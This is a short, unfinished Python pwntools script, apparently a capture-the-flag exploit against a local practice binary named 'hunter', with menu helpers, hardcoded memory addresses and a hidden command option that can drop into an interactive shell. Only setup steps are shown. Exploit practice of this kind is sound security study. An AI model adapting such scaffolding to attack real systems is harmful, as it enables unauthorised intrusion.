#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

def initer(name):

    p.recvuntil("?:")
    p.sendline("name")
    p.recvuntil("item\n")

def spawn(expr, color, name):

    p.sendline("1")
    p.recvuntil("expr: ")
    p.sendline(str(expr))
    p.recvuntil("color: ")
    p.sendline(str(color))
    p.recvuntil("name: ")
    p.send(name)
    time.sleep(0.2)
    return p.recvuntil("item\n")

def hunt():

    p.sendline("2")
    time.sleep(0.2)
    return p.recvuntil("item\n")

def change(name):

    p.sendline("3")
    p.recvuntil("name?:")
    p.send(name)
    time.sleep(0.2)
    p.recvuntil("item\n")

def buy(item):

    p.sendline("4")
    p.recvuntil("sphere (300 zeny)\n")
    p.sendline(str(item))
    time.sleep(0.2)
    return p.recvuntil("item\n")

def leet(command, shell=0):

    p.sendline("1337")
    p.recvuntil("mand? :")
    p.send(command)
    if shell == 1:
        p.interactive()
    return p.recvuntil("item\n")

command = 0x804b06c
money_size = 0x804b078
r = 0

while r < 1: #to make two circum meet.
    p = process("./hunter")
    initer("afang")
    for i in range(10):
        spawn(123,33,"afang")
    wait("now")
